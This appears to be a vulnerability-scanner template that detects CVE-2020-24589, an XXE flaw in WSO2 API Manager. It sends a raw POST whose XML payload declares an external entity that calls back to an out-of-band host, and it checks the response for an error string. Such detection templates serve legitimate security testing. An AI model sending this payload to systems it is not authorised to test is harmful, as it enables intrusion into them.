id: CVE-2020-24589
info:
  name: WSO2 API Manager save_artifact_ajaxprocessor.jsp XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    WSO2 API Manager is vulnerable to XML External Entity (XXE) Injection due to improper validation in the `save_artifact_ajaxprocessor.jsp` endpoint. Successful exploitation can allow attackers to read arbitrary files or access sensitive internal information.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-24589
  classification:
    cve-id: CVE-2020-24589
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.1
  metadata:
    affected-products:
      - WSO2 API Manager >= 3.1.0
      - API Microgateway >= 2.2.0
    attack-surface:
      - Application
      - Service
http:
  - raw:
      - |
        POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        payload=<?xml version="1.0" ?><!DOCTYPE a [ <!ENTITY % xxe SYSTEM "http://{{interactsh-url}}"> %xxe;]>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Failed to install the generic artifact type"
        part: body
    extractors:
      - type: regex
        part: body
        regex:
          - "Failed to install the generic artifact type"
